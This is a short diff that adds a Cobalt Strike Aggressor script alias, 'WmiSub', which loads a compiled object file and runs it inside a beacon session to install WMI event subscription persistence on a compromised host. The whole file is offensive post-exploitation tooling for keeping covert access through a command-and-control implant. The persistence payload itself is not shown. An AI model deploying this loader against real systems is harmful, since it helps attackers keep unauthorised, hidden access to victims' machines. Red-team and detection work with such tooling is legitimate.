@@ -1,0 +1,12 @@
+alias WmiSub {
+	local('$handle $data');
+
+    $handle = openf(script_resource("WmiSub.o"));
+	$data   = readb($handle, -1);
+	closef($handle)
+
+	btask($1, "Running WMI Event Subscription Persistence Technique");
+
+
+	beacon_inline_execute($1,$data,"go");
+}
